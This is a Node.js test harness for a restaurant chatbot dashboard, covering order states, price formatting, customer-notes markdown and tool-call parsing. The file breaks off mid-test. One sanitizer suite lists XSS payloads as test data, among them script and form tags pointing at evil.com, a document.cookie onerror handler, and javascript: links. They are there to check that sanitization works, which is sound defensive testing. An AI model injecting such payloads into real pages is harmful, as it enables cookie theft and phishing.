/**
 * Empirical Stress Test Suite & Verification Harness (Challenger 2)
 * ChatAliado Playground - Kitchen Dashboard, Customer Memory & LLM Tools Inspector
 *
 * Covers:
 * 1. Kitchen order transitions (draft -> confirmed -> preparing -> delivered -> cancelled),
 *    item option variations (arrays, nested JSON, special instructions), price calculations,
 *    and large orders (20+ items).
 * 2. Customer memory `notes_md` rendering with malicious markdown / XSS vectors,
 *    large notes (5000+ chars), and empty notes.
 * 3. Tools timeline parser under high volume (30+ tool calls), malformed metadata,
 *    unmatched tool results, and unknown tool names.
 * 4. Conversational mode transitions (ai -> human -> ai) and handoff reason extraction.
 */

import { strict as assert } from 'node:assert';
import { performance } from 'node:perf_hooks';
import { PlaygroundStore } from './js/store.js';
import {
  STATUS_CONFIG,
  formatCurrency,
  formatDiscount,
  formatOrderId,
  formatDateTime,
  getStatusBadgeConfig,
  formatPaymentMethod,
  formatPaymentStatus,
  formatDeliveryAddress,
  parseOptions,
  renderOptionsHtml,
  formatKitchenClipboardSummary,
  KitchenUI,
} from './js/kitchen-ui.js';
import {
  TOOL_METADATA,
  getToolMeta,
  escapeHtml,
  sanitizeHtml,
  simpleMarkdownParser,
  renderMarkdown,
  formatCharCount,
  formatJson,
  syntaxHighlightJson,
  extractHandoffReason,
  filterToolExecutions,
  formatTimestamp,
  DebuggerUI,
} from './js/debugger-ui.js';

console.log('================================================================================');
console.log('🔥 CHALLENGER 2: EMPIRICAL STRESS TEST & ADVERSARIAL HARNESS');
console.log('================================================================================\n');

let totalTests = 0;
let passedTests = 0;

function runTest(description, fn) {
  totalTests++;
  try {
    fn();
    passedTests++;
    console.log(`  ✅ [PASS] ${description}`);
  } catch (err) {
    console.error(`  ❌ [FAIL] ${description}`);
    console.error(`     Error: ${err.message}`);
    if (err.stack) {
      console.error(`     Stack: ${err.stack.split('\n').slice(1, 4).join('\n')}`);
    }
    throw err;
  }
}

// ============================================================================
// SUITE 1: KITCHEN DASHBOARD & ORDER TRANSITIONS, OPTIONS & LARGE ORDERS
// ============================================================================
console.log('--------------------------------------------------------------------------------');
console.log('📦 SUITE 1: Kitchen Order Transitions, Options Variations, Financials & Large Orders');
console.log('--------------------------------------------------------------------------------');

// 1.1 Complete Lifecycle Transitions
runTest('Kitchen order status transitions across full lifecycle', () => {
  const transitions = [
    { input: null, expectedKey: 'none', label: 'Sin orden activa', icon: '⚪' },
    { input: 'draft', expectedKey: 'draft', label: 'Borrador en curso', icon: '🟡', pulse: 'pulse-amber' },
    { input: 'confirmed', expectedKey: 'confirmed', label: 'Confirmado / En Cocina', icon: '🟢', pulse: 'pulse-emerald' },
    { input: 'preparing', expectedKey: 'preparing', label: 'En Preparación', icon: '🔵' },
    { input: 'delivered', expectedKey: 'delivered', label: 'Entregado', icon: '🟣' },
    { input: 'cancelled', expectedKey: 'cancelled', label: 'Cancelado', icon: '🔴' },
    { input: 'none', expectedKey: 'none', label: 'Sin orden activa', icon: '⚪' },
  ];

  for (const t of transitions) {
    const config = getStatusBadgeConfig(t.input);
    assert.equal(config.status, t.expectedKey);
    assert.equal(config.label, t.label);
    assert.equal(config.icon, t.icon);
    if (t.pulse) {
      assert.ok(config.pulseClass.includes(t.pulse));
    }
  }
});

// 1.2 Case-insensitivity, whitespace, and unmapped fallback
runTest('Kitchen order status badge resilience against malformed / unmapped inputs', () => {
  assert.equal(getStatusBadgeConfig('  DRAFT  ').status, 'draft');
  assert.equal(getStatusBadgeConfig('CONFIRMED').status, 'confirmed');
  assert.equal(getStatusBadgeConfig('Preparing').status, 'preparing');
  assert.equal(getStatusBadgeConfig('DELIVERED').status, 'delivered');
  assert.equal(getStatusBadgeConfig('Cancelled').status, 'cancelled');
  assert.equal(getStatusBadgeConfig('refunded').status, 'none');
  assert.equal(getStatusBadgeConfig('unknown_status_xyz').status, 'none');
  assert.equal(getStatusBadgeConfig(12345).status, 'none');
  assert.equal(getStatusBadgeConfig(undefined).status, 'none');
  assert.equal(getStatusBadgeConfig('').status, 'none');
});

// 1.3 Item Options Parsing: Arrays of Objects, Strings, and Nested JSON
runTest('Options parser: Array of structured option objects with price modifiers', () => {
  const input = [
    { group_name: 'Tamaño', choice_label: 'Familiar', price_modifier: 60 },
    { group_name: 'Orilla', choice_label: 'Rellena de Queso', price_modifier: 35 },
    { group_name: 'Notas Especiales', choice_label: 'Bien dorada de abajo' },
  ];
  const parsed = parseOptions(input);
  assert.equal(parsed.length, 3);
  assert.equal(parsed[0].key, 'tamao');
  assert.equal(parsed[0].label, 'Tamaño');
  assert.equal(parsed[0].value, 'Familiar');
  assert.equal(parsed[0].priceModifier, 60);
  assert.equal(parsed[0].isNote, false);

  assert.equal(parsed[1].label, 'Orilla');
  assert.equal(parsed[1].value, 'Rellena de Queso');
  assert.equal(parsed[1].priceModifier, 35);
  assert.equal(parsed[1].isNote, false);

  assert.equal(parsed[2].label, 'Notas Especiales');
  assert.equal(parsed[2].value, 'Bien dorada de abajo');
  assert.equal(parsed[2].isNote, true);
});

runTest('Options parser: Array of simple strings', () => {
  const input = ['Extra queso', 'Sin champiñones', 'Salsa de ajo aparte'];
  const parsed = parseOptions(input);
  assert.equal(parsed.length, 3);
  assert.equal(parsed[0].value, 'Extra queso');
  assert.equal(parsed[1].value, 'Sin champiñones');
  assert.equal(parsed[2].value, 'Salsa de ajo aparte');
});

runTest('Options parser: Object key-value map with nested values and notes', () => {
  const input = {
    size: 'Grande',
    crust: 'Normal',
    drink: 'Coca Cola 2L',
    instructions: 'Tocar timbre 3 veces',
    extra: 'Parmesano',
  };
  const parsed = parseOptions(input);
  assert.equal(parsed.length, 5);
  const notesOpt = parsed.find(o => o.key === 'instructions' || o.label === 'Notas');
  assert.ok(notesOpt);
  assert.equal(notesOpt.value, 'Tocar timbre 3 veces');
  assert.equal(notesOpt.isNote, true);

  const sizeOpt = parsed.find(o => o.key === 'size');
  assert.ok(sizeOpt);
  assert.equal(sizeOpt.label, 'Tamaño');
  assert.equal(sizeOpt.value, 'Grande');
  assert.equal(sizeOpt.isNote, false);
});

runTest('Options parser: JSON string input and malformed string fallbacks', () => {
  // Valid JSON string
  const jsonStr = JSON.stringify({ size: 'Mediana', toppings: ['Jalapeño', 'Tocino'] });
  const parsedJson = parseOptions(jsonStr);
  assert.equal(parsedJson.length, 2);

  // Non-JSON plain text string (treated as a note)
  const plainText = 'Sin cebolla, bien caliente';
  const parsedPlain = parseOptions(plainText);
  assert.equal(parsedPlain.length, 1);
  assert.equal(parsedPlain[0].isNote, true);
  assert.equal(parsedPlain[0].value, 'Sin cebolla, bien caliente');

  // Empty or invalid JSON strings
  assert.deepEqual(parseOptions(''), []);
  assert.deepEqual(parseOptions('   '), []);
  assert.deepEqual(parseOptions('null'), []);
  assert.deepEqual(parseOptions('{}'), []);
  assert.deepEqual(parseOptions('[]'), []);
  assert.deepEqual(parseOptions(null), []);
  assert.deepEqual(parseOptions(undefined), []);
});

// 1.4 HTML Option Pills Rendering & Escaping
runTest('Options HTML rendering with price pills, notes pills, and XSS safety', () => {
  const options = [
    { key: 'size', label: 'Tamaño', value: 'Grande <script>alert(1)</script>', priceModifier: 50, isNote: false },
    { key: 'notes', label: 'Notas', value: 'Sin sal & salsa aparte "urgente"', isNote: true },
  ];
  const html = renderOptionsHtml(options);
  assert.ok(!html.includes('<script>'), 'HTML output must escape raw tags');
  assert.ok(html.includes('&lt;script&gt;'), 'HTML output must have escaped tags');
  assert.ok(html.includes('+$50.00'), 'Price modifier pill must be formatted as currency');
  assert.ok(html.includes('📝'), 'Note option must have notepad emoji');
  assert.ok(html.includes('&amp;'), 'Ampersand must be escaped');
  assert.ok(html.includes('&quot;'), 'Quotes must be escaped');
});

// 1.5 Deterministic Financial Calculations & Currency Rendering
runTest('Financial summary calculation & currency rendering across edge cases', () => {
  // Normal order
  assert.equal(formatCurrency(350), '$350.00');
  assert.equal(formatCurrency(350, true), '$350.00 MXN');
  assert.equal(formatDiscount(40), '-$40.00');
  assert.equal(formatDiscount(-40), '-$40.00');

  // Floating point precision
  const subtotal = 19.99 * 3; // 59.97000000000001
  assert.equal(formatCurrency(subtotal), '$59.97');

  // Zero and boundary cases
  assert.equal(formatCurrency(0), '$0.00');
  assert.equal(formatCurrency('0.00'), '$0.00');
  assert.equal(formatCurrency(-0), '$0.00');
  assert.equal(formatDiscount(0), '-$0.00');

  // Non-numeric / corrupt inputs
  assert.equal(formatCurrency(null), '$0.00');
  assert.equal(formatCurrency(undefined), '$0.00');
  assert.equal(formatCurrency('invalid_number'), '$0.00');
  assert.equal(formatCurrency(NaN), '$0.00');
  assert.equal(formatCurrency(Infinity), '$0.00');
});

// 1.6 Large Order Stress Test (25+ items and high quantity)
runTest('Large order stress test (25+ items, 100+ total quantity, comanda generation)', () => {
  const items = [];
  let calculatedSubtotal = 0;

  for (let i = 1; i <= 30; i++) {
    const qty = (i % 5) + 1;
    const unitPrice = 120 + i * 5;
    const lineSubtotal = qty * unitPrice;
    calculatedSubtotal += lineSubtotal;

    items.push({
      id: `item-${i}`,
      product_name: `Pizza Especial #${i}`,
      quantity: qty,
      unit_price: unitPrice,
      subtotal: lineSubtotal,
      options_selected: [
        { group_name: 'Tamaño', choice_label: i % 2 === 0 ? 'Familiar' : 'Individual' },
        { group_name: 'Notas', choice_label: `Instrucción especial para ítem #${i}` },
      ],
    });
  }

  const largeOrder = {
    id: 'b1234567-89ab-cdef-0123-456789abcdef',
    status: 'confirmed',
    created_at: '2026-08-21T18:00:00Z',
    subtotal: calculatedSubtotal,
    delivery_fee: 45.0,
    discount: 50.0,
    total: calculatedSubtotal + 45.0 - 50.0,
    delivery_address: 'Av. Insurgentes Sur 1602, Piso 4, Benito Juárez, CDMX',
    payment_method: 'cash',
    payment_status: 'pending',
    order_items: items,
  };

  const customer = {
    name: 'Carlos Mendoza',
    phone: '5215512345678',
    address_default: 'Av. Insurgentes Sur 1602',
  };

  // Verify total items count
  const totalQty = items.reduce((acc, it) => acc + it.quantity, 0);
  assert.equal(items.length, 30);
  assert.ok(totalQty >= 90);

  // Generate Comanda
  const startTime = performance.now();
  const comanda = formatKitchenClipboardSummary(largeOrder, customer, items);
  const elapsed = performance.now() - startTime;

  assert.ok(elapsed < 50, `Comanda generation must be fast (<50ms on cold ICU), took ${elapsed.toFixed(2)}ms`);
  assert.ok(comanda.includes('🍕 COMANDA DE COCINA - CHATALIADO'));
  assert.ok(comanda.includes('#ORD-B1234567'));
  assert.ok(comanda.includes('CONFIRMADO / EN COCINA'));
  assert.ok(comanda.includes('Carlos Mendoza (+5215512345678)'));
  assert.ok(comanda.includes('Pizza Especial #1'));
  assert.ok(comanda.includes('Pizza Especial #30'));
  assert.ok(comanda.includes(formatCurrency(largeOrder.total, true)));
  assert.ok(comanda.includes('Efectivo'));
});

// 1.7 Mock DOM Verification for KitchenUI Component
runTest('KitchenUI DOM lifecycle rendering and store reactivity', () => {
  // Setup Mock DOM elements
  const elements = {
    'panel-kitchen-orders': { querySelector: () => null },
    'order-status-badge': { className: '', innerHTML: '' },
    'order-id-label': { textContent: '' },
    'order-created-time': { textContent: '' },
    'order-items-count-badge': { textContent: '' },
    'order-empty-state': { classList: { classes: new Set(), add(c) { this.classes.add(c); }, remove(c) { this.classes.delete(c); } } },
    'order-items-table': { classList: { classes: new Set(['hidden']), add(c) { this.classes.add(c); }, remove(c) { this.classes.delete(c); } } },
    'order-items-tbody': { innerHTML: '' },
    'order-subtotal': { textContent: '' },
    'order-delivery-fee': { textContent: '' },
    'order-discount': { textContent: '' },
    'order-total-amount': { textContent: '' },
    'order-delivery-address': { textContent: '' },
    'order-payment-method': { textContent: '' },
    'order-payment-status': { textContent: '' },
    'btn-refresh-sync': {},
  };

  globalThis.document = {
    getElementById: (id) => elements[id] || null,
    readyState: 'complete',
    addEventListener: () => {},
  };

  const storeInstance = new PlaygroundStore();
  const ui = new KitchenUI(storeInstance);
  ui.init();

  // Test 1: Empty state initial render
  assert.equal(elements['order-id-label'].textContent, 'Ninguna');
  assert.equal(elements['order-status-badge'].innerHTML, '<span>⚪</span> <span>Sin orden activa</span>');
  assert.equal(elements['order-items-count-badge'].textContent, '0 ítems');
  assert.ok(!elements['order-empty-state'].classList.classes.has('hidden'));

  // Test 2: Active Draft Order with 2 items
  storeInstance.updateState({
    activeOrder: {
      id: 'd1112223-3333-4444-5555-666677778888',
      status: 'draft',
      created_at: '2026-08-21T19:15:00Z',
      subtotal: 300,
      delivery_fee: 35,
      discount: 0,
      total: 335,
      delivery_address: 'Calle Oaxaca 45, Roma Norte',
      payment_method: 'card',
      payment_status: 'pending',
      order_items: [
        {
          product_name: 'Pizza Pepperoni',
          quantity: 2,
          unit_price: 150,
          subtotal: 300,
          options_selected: { size: 'Grande', notes: 'Masa delgada' },
        },
      ],
    },
    customer: {
      name: 'Zam',
      phone: '5215598765432',
      address_default: 'Calle Oaxaca 45',
    },
  });

  assert.equal(elements['order-id-label'].textContent, '#ORD-D1112223');
  assert.ok(elements['order-status-badge'].innerHTML.includes('Borrador en curso'));
  assert.equal(elements['order-items-count-badge'].textContent, '2 ítems');
  assert.ok(elements['order-empty-state'].classList.classes.has('hidden'));
  assert.ok(elements['order-items-tbody'].innerHTML.includes('Pizza Pepperoni'));
  assert.ok(elements['order-items-tbody'].innerHTML.includes('2x'));
  assert.equal(elements['order-subtotal'].textContent, '$300.00');
  assert.equal(elements['order-total-amount'].textContent, '$335.00 MXN');
  assert.equal(elements['order-payment-method'].textContent, 'Tarjeta');
  assert.equal(elements['order-payment-status'].textContent, 'Pendiente');

  // Test 3: Status transition to confirmed -> preparing -> delivered -> cancelled
  for (const st of ['confirmed', 'preparing', 'delivered', 'cancelled']) {
    const current = storeInstance.getState().activeOrder;
    storeInstance.updateState({ activeOrder: { ...current, status: st } });
    const badge = getStatusBadgeConfig(st);
    assert.ok(elements['order-status-badge'].innerHTML.includes(badge.label));
  }

  // Cleanup
  ui.destroy();
});

// ============================================================================
// SUITE 2: CUSTOMER MEMORY (notes_md), XSS VECTORS, LARGE & EMPTY NOTES
// ============================================================================
console.log('\n--------------------------------------------------------------------------------');
console.log('🛡️ SUITE 2: Customer Memory (notes_md), XSS Vectors, Sanitization & High Volumes');
console.log('--------------------------------------------------------------------------------');

// 2.1 Malicious Markdown & XSS Vectors
runTest('XSS Sanitization: Script tags, iframes, and dangerous HTML elements', () => {
  const attackVectors = [
    '<script>alert("xss1")</script>',
    '<SCRIPT SRC="https://evil.com/xss.js"></SCRIPT>',
    '<iframe src="https://evil.com/phishing"></iframe>',
    '<object data="exploit.swf"></object>',
    '<embed src="exploit.swf">',
    '<form action="https://evil.com/steal"><input name="pass"></form>',
    '<meta http-equiv="refresh" content="0;url=evil.com">',
    '<link rel="stylesheet" href="http://evil.com/steal.css">',
  ];

  for (const attack of attackVectors) {
    const sanitized = sanitizeHtml(attack);
    assert.ok(!sanitized.toLowerCase().includes('<script'), `Sanitizer failed to remove script tag: ${attack}`);
    assert.ok(!sanitized.toLowerCase().includes('<iframe'), `Sanitizer failed to remove iframe tag: ${attack}`);
    assert.ok(!sanitized.toLowerCase().includes('<object'), `Sanitizer failed to remove object tag: ${attack}`);
    assert.ok(!sanitized.toLowerCase().includes('<embed'), `Sanitizer failed to remove embed tag: ${attack}`);
    assert.ok(!sanitized.toLowerCase().includes('<form'), `Sanitizer failed to remove form tag: ${attack}`);
    assert.ok(!sanitized.toLowerCase().includes('<meta'), `Sanitizer failed to remove meta tag: ${attack}`);
    assert.ok(!sanitized.toLowerCase().includes('<link'), `Sanitizer failed to remove link tag: ${attack}`);
  }
});

runTest('XSS Sanitization: Inline event handlers (onerror, onload, onclick, onmouseover)', () => {
  const eventVectors = [
    '<img src="invalid-img.png" onerror="alert(document.cookie)">',
    '<img src=x onerror=alert(1)>',
    '<svg onload="alert(\'svg-xss\')"><circle r="5"/></svg>',
    '<body onload="alert(1)">',
    '<div onmouseover="alert(\'hover\')" onclick="stealData()">Pasa el mouse aquí</div>',
    '<input type="text" onfocus="alert(1)" autofocus>',
  ];

  for (const attack of eventVectors) {
    const sanitized = sanitizeHtml(attack);
    assert.ok(!sanitized.includes('onerror='), `Failed on onerror: ${attack}`);
    assert.ok(!sanitized.includes('onload='), `Failed on onload: ${attack}`);
    assert.ok(!sanitized.includes('onclick='), `Failed on onclick: ${attack}`);
    assert.ok(!sanitized.includes('onmouseover='), `Failed on onmouseover: ${attack}`);
    assert.ok(!sanitized.includes('onfocus='), `Failed on onfocus: ${attack}`);
  }
});

runTest('XSS Sanitization: Dangerous pseudo-protocols (javascript:, data:)', () => {
  const urlVectors = [
    '<a href="javascript:alert(1)">Haz clic para 50% de descuento</a>',
    '<a href=\'javascript:eval("steal()")\'>Premio</a>',
    '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">Ver factura</a>',
    '<img src="javascript:alert(1)">',
  ];

  for (const attack of urlVectors) {
    const sanitized = sanitizeHtml(attack);
    assert.ok(!sanitized.includes('javascript:'), `Failed to strip javascript: URL: ${attack}`);
    assert.ok(!sanitized.includes('data:text/html'), `Failed to strip data: URL: ${attack}`);
  }
});

runTest('Markdown Renderer: Native fallback parser properly escapes HTML and styles markdown', () => {
  const mdInput = `
# Bloc de Notas
- **Alergia:** Mariscos & nueces <script>alert("hack")</script>
- *Preferencia:* Masa delgada con orilla \`rellena de queso\`
> Nota del mesero: Entregar antes de las 9:00 PM.
  `;

  const rendered = renderMarkdown(mdInput);
  assert.ok(!rendered.includes('<script>'), 'Rendered markdown must not contain raw script tag');
  assert.ok(rendered.includes('&lt;script&gt;'), 'Rendered markdown must contain escaped script tag');
  assert.ok(rendered.includes('&amp;'), 'Ampersand must be escaped');
  assert.ok(rendered.includes('<strong class="font-bold text-sky-400">Alergia:</strong>'), 'Bold text rendered with sky styling');
  assert.ok(rendered.includes('<code class='), 'Inline code block rendered');
  assert.ok(rendered.includes('<blockquote class='), 'Blockquote rendered');
});

// 2.2 Very Large Notes (5,000+ to 50,000+ chars) & Performance
runTest('Large notes markdown rendering benchmark (5,000 to 50,000 chars)', () => {
  const chunk = `
## Sección de Notas del Cliente
- **Alergia alimentaria recurrente:** Alérgico a los mariscos, crustáceos y sulfitos.
- *Historial de pedidos:* Ha pedido 45 veces la pizza de pepperoni con orilla rellena de queso.
- Preferencias de salsa: Salsa chimichurri y salsa macha en frascos separados.
- Código promocional permanente: \`VIP-DESCUENTO-20\`
> Instrucciones de entrega: Dejar el paquete con el guardia del edificio en recepción B.

`;
  // Generate 10,000 chars
  let largeNotes = chunk.repeat(20);
  assert.ok(largeNotes.length >= 8000, `Length is ${largeNotes.length}`);

  // Test character count formatting
  assert.equal(formatCharCount(0, 5000), '0 / 5,000 caracteres');
  assert.equal(formatCharCount(4999, 5000), '4,999 / 5,000 caracteres');
  assert.equal(formatCharCount(5000, 5000), '5,000 / 5,000 caracteres');
  assert.equal(formatCharCount(largeNotes.length, 5000), `${largeNotes.length.toLocaleString()} / 5,000 caracteres`);

  // Benchmark parsing speed
  const startTime = performance.now();
  const rendered = renderMarkdown(largeNotes);
  const duration = performance.now() - startTime;

  assert.ok(rendered.length > 5000, 'Rendered HTML must be complete');
  assert.ok(duration < 50, `Large markdown rendering must execute under 50ms (took ${duration.toFixed(2)}ms)`);

  // Stress test with 50,000 chars
  const massiveNotes = chunk.repeat(100);
  const startMassive = performance.now();
  const renderedMassive = renderMarkdown(massiveNotes);
  const durationMassive = performance.now() - startMassive;

  assert.ok(renderedMassive.length > 30000);
  assert.ok(durationMassive < 150, `50k chars markdown must execute under 150ms (took ${durationMassive.toFixed(2)}ms)`);
});

// 2.3 Empty and Null Notes Handling
runTest('Empty, null, and whitespace-only customer memory notes', () => {
  assert.equal(renderMarkdown(''), '');
  assert.equal(renderMarkdown(null), '');
  assert.equal(renderMarkdown(undefined), '');
  assert.equal(renderMarkdown('   \n\t  \n  '), '');
});

// ============================================================================
// SUITE 3: TOOLS TIMELINE PARSER, HIGH VOLUME, MALFORMED DATA & FILTERING
// ============================================================================
console.log('\n--------------------------------------------------------------------------------');
console.log('⚡ SUITE 3: Tools Timeline Parser, High Volume, Malformed Metadata & Filtering');
console.log('--------------------------------------------------------------------------------');

// 3.1 High Volume Tool Executions Parsing (50 tool calls)
runTest('Tools parser: High volume benchmark (50 tool calls with outputs and arguments)', () => {
  const storeInstance = new PlaygroundStore();
  const mockMessages = [];

  for (let i = 1; i <= 50; i++) {
    const callId = `call_${String(i).padStart(4, '0')}`;
    const toolName = Object.keys(TOOL_METADATA)[i % 10];

    // Assistant message with tool call
    mockMessages.push({
      id: `msg_asst_${i}`,
      role: 'assistant',
      content: `Llamando a herramienta ${toolName}...`,
      created_at: new Date(Date.now() + i * 1000).toISOString(),
      metadata: {
        tool_calls: [
          {
            id: callId,
            type: 'function',
            function: {
              name: toolName,
              arguments: JSON.stringify({ item_id: `prod_${i}`, quantity: (i % 3) + 1, notes: `Nota #${i}` }),
            },
          },
        ],
      },
    });

    // Tool response message
    mockMessages.push({
      id: `msg_tool_${i}`,
      role: 'tool',
      content: JSON.stringify({ success: true, item_id: `prod_${i}`, message: `Operación ${i} completada.` }),
      created_at: new Date(Date.now() + i * 1000 + 200).toISOString(),
      metadata: {
        tool_call_id: callId,
      },
    });
  }

  assert.equal(mockMessages.length, 100);

  const startParse = performance.now();
  const traces = storeInstance.parseToolExecutions(mockMessages);
  const parseDuration = performance.now() - startParse;

  assert.equal(traces.length, 50, 'Must parse exactly 50 tool traces');
  assert.ok(parseDuration < 25, `50 tool calls parsed in ${parseDuration.toFixed(2)}ms (target <25ms)`);

  for (let i = 0; i < 50; i++) {
    const trace = traces[i];
    assert.equal(trace.id, `call_${String(i + 1).padStart(4, '0')}`);
    assert.equal(trace.status, 'success');
    assert.ok(trace.args && typeof trace.args === 'object');
    assert.equal(trace.args.item_id, `prod_${i + 1}`);
    assert.ok(trace.output && trace.output.success === true);
  }
});

// 3.2 Malformed & Adversarial Tool Metadata
runTest('Tools parser: Malformed arguments, invalid JSON, missing properties, corrupted arrays', () => {
  const storeInstance = new PlaygroundStore();
  const malformedMessages = [
    // 1. Tool call with invalid JSON arguments
    {
      id: 'msg_1',
      role: 'assistant',
      metadata: {
        tool_calls: [
          {
            id: 'call_malformed_json',
            function: {
              name: 'add_order_item',
              arguments: '{malformed_json: true, missing_quotes',
            },
          },
        ],
      },
    },
    // 2. Tool call with null function / missing names
    {
      id: 'msg_2',
      role: 'assistant',
      metadata: {
        tool_calls: [
          {
            id: 'call_missing_func',
            // function property missing entirely
          },
        ],
      },
    },
    // 3. Tool call with non-array tool_calls
    {
      id: 'msg_3',
      role: 'assistant',
      metadata: {
        tool_calls: 'not-an-array',
      },
    },
    // 4. Tool response with invalid JSON content
    {
      id: 'msg_4',
      role: 'tool',
      content: 'Texto plano no-JSON devuelto por error del servidor',
      metadata: {
        tool_call_id: 'call_malformed_json',
      },
    },
    // 5. Tool response with missing tool_call_id (uses msg.id fallback)
    {
      id: 'orphan_tool_msg',
      role: 'tool',
      content: '{"result": "ok"}',
    },
  ];

  const traces = storeInstance.parseToolExecutions(malformedMessages);
  assert.equal(traces.length, 2, 'Should extract 2 valid tool traces despite malformed entries');

  const trace1 = traces.find(t => t.id === 'call_malformed_json');
  assert.ok(trace1);
  assert.equal(trace1.name, 'add_order_item');
  assert.equal(typeof trace1.args, 'string', 'Malformed JSON args preserved as raw string');
  assert.equal(trace1.output, 'Texto plano no-JSON devuelto por error del servidor');
  assert.equal(trace1.status, 'success');

  const trace2 = traces.find(t => t.id === 'call_missing_func');
  assert.ok(trace2);
  assert.equal(trace2.name, 'unknown_tool');
  assert.equal(trace2.status, 'pending');
});

// 3.3 Unmatched Tool Results & Pending States
runTest('Tools parser: Unmatched tool results and pending states', () => {
  const storeInstance = new PlaygroundStore();
  const messages = [
    // 3 tool calls dispatched
    {
      id: 'msg_asst_1',
      role: 'assistant',
      metadata: {
        tool_calls: [
          { id: 'call_1', function: { name: 'get_menu', arguments: '{}' } },
          { id: 'call_2', function: { name: 'create_order', arguments: '{"customer_id": "c1"}' } },
          { id: 'call_3', function: { name: 'add_order_item', arguments: '{"product_id": "p1"}' } },
        ],
      },
    },
    // Only call_1 and call_3 got responses; call_2 is still pending
    {
      id: 'msg_tool_1',
      role: 'tool',
      content: JSON.stringify({ menu: ['Pizza 1', 'Pizza 2'] }),
      metadata: { tool_call_id: 'call_1' },
    },
    {
      id: 'msg_tool_3',
      role: 'tool',
      content: JSON.stringify({ item_added: true }),
      metadata: { tool_call_id: 'call_3' },
    },
  ];

  const traces = storeInstance.parseToolExecutions(messages);
  assert.equal(traces.length, 3);

  const t1 = traces.find(t => t.id === 'call_1');
  assert.equal(t1.status, 'success');
  assert.ok(t1.output.menu);

  const t2 = traces.find(t => t.id === 'call_2');
  assert.equal(t2.status, 'pending');
  assert.equal(t2.output, null);

  const t3 = traces.find(t => t.id === 'call_3');
  assert.equal(t3.status, 'success');
  assert.equal(t3.output.item_added, true);
});

// 3.4 Unknown Tool Names and Fallback Configurations
runTest('Unknown tool names: Custom or hallucinated tools fallback safely', () => {
  const unknownNames = [
    'search_web',
    'calculate_distance',
    'arbitrary_code_runner',
    'special_discount_v2',
    '',
    null,
    undefined,
  ];

  for (const name of unknownNames) {
    const meta = getToolMeta(name);
    assert.ok(meta, `Metadata must be returned for ${name}`);
    assert.equal(meta.color, 'slate');
    assert.equal(meta.icon, '⚙️');
    assert.ok(meta.badgeClass.includes('slate'));
    assert.ok(meta.borderClass.includes('slate'));
    assert.ok(meta.description.length > 0);
  }
});

// 3.5 Timeline Filtering and Search
runTest('Tool executions filtering: Search by text, tool name, and status', () => {
  const sampleTraces = [
    { id: 'call_01', name: 'get_menu', args: { category: 'pizzas' }, output: { count: 12 }, status: 'success' },
    { id: 'call_02', name: 'create_order', args: { customer_id: 'cust_99' }, output: { order_id: 'ord_1' }, status: 'success' },
    { id: 'call_03', name: 'add_order_item', args: { product: 'Pepperoni Especial', qty: 2 }, output: { subtotal: 300 }, status: 'success' },
    { id: 'call_04', name: 'add_order_item', args: { product: 'Hawaiana', qty: 1 }, output: null, status: 'pending' },
    { id: 'call_05', name: 'confirm_order', args: { payment: 'cash' }, output: { error: 'Address required' }, status: 'error' },
  ];

  // 1. Filter by Name
  const menuTraces = filterToolExecutions(sampleTraces, { toolName: 'get_menu' });
  assert.equal(menuTraces.length, 1);
  assert.equal(menuTraces[0].id, 'call_01');

  const addItemTraces = filterToolExecutions(sampleTraces, { toolName: 'add_order_item' });
  assert.equal(addItemTraces.length, 2);

  // 2. Filter by Status
  const pendingTraces = filterToolExecutions(sampleTraces, { status: 'pending' });
  assert.equal(pendingTraces.length, 1);
  assert.equal(pendingTraces[0].id, 'call_04');

  const errorTraces = filterToolExecutions(sampleTraces, { status: 'error' });
  assert.equal(errorTraces.length, 1);
  assert.equal(errorTraces[0].id, 'call_05');

  // 3. Search query
  const pepperTraces = filterToolExecutions(sampleTraces, { query: 'pepperoni' });
  assert.equal(pepperTraces.length, 1);
  assert.equal(pepperTraces[0].id, 'call_03');

  const addressSearch = filterToolExecutions(sampleTraces, { query: 'Address required' });
  assert.equal(addressSearch.length, 1);
  assert.equal(addressSearch[0].id, 'call_05');

  // 4. Combined filters
  const combined = filterToolExecutions(sampleTraces, { toolName: 'add_order_item', status: 'pending' });
  assert.equal(combined.length, 1);
  assert.equal(combined[0].id, 'call_04');
});

// ============================================================================
// SUITE 4: CONVERSATIONAL MODE TRANSITIONS & HANDOFF REASON EXTRACTION
// ============================================================================
console.log('\n--------------------------------------------------------------------------------');
console.log('👤 SUITE 4: Conversational Mode Transitions & Handoff Reason Extraction');
console.log('--------------------------------------------------------------------------------');

// 4.1 Multi-source Handoff Reason Extraction
runTest('Handoff reason extraction: All 6 priority fallback sources', () => {
  // Source 1: Direct conversation.handoff_reason property
  const src1 = { conversation: { mode: 'human', handoff_reason: 'El cliente solicitó cancelar y hablar con un gerente' } };
  assert.equal(extractHandoffReason(src1), 'El cliente solicitó cancelar y hablar con un gerente');

  // Source 2: Direct conversation.metadata.reason property
  const src2 = { conversation: { mode: 'human', metadata: { reason: 'Duda compleja sobre facturación fiscal CFDI' } } };
  assert.equal(extractHandoffReason(src2), 'Duda compleja sobre facturación fiscal CFDI');

  // Source 3: Top-level handoff_reason / metadata
  const src3 = { handoff_reason: 'Queja sobre tiempo de entrega' };
  assert.equal(extractHandoffReason(src3), 'Queja sobre tiempo de entrega');

  // Source 4: Tool execution trace (handoff_to_human)
  const src4 = {
    conversation: { mode: 'human' },
    toolExecutions: [
      { name: 'get_menu', args: {} },
      { name: 'handoff_to_human', args: { reason: 'El cliente pide hablar con una persona real' } },
    ],
  };
  assert.equal(extractHandoffReason(src4), 'El cliente pide hablar con una persona real');

  // Source 5: Assistant message tool call in messages array
  const src5 = {
    conversation: { mode: 'human' },
    messages: [
      {
        role: 'assistant',
        metadata: {
          tool_calls: [
            {
              function: {
                name: 'handoff_to_human',
                arguments: JSON.stringify({ motivo: 'Alergia severa no listada en el menú' }),
              },
            },
          ],
        },
      },
    ],
  };
  assert.equal(extractHandoffReason(src5), 'Alergia severa no listada en el menú');

  // Source 6: System message regex parsing
  const src6 = {
    conversation: { mode: 'human' },
    messages: [
      {
        role: 'system',
        content: 'Conversación transferida a humano. Motivo: Cambio de dirección de entrega fuera de cobertura',
      },
    ],
  };
  assert.equal(extractHandoffReason(src6), 'Cambio de dirección de entrega fuera de cobertura');

  // Null fallback when no handoff reason exists
  assert.equal(extractHandoffReason({ conversation: { mode: 'ai' } }), null);
  assert.equal(extractHandoffReason(null), null);
});

// 4.2 Conversational Mode Transitions (ai -> human -> ai -> human)
runTest('Conversational mode transitions and store event cycle', () => {
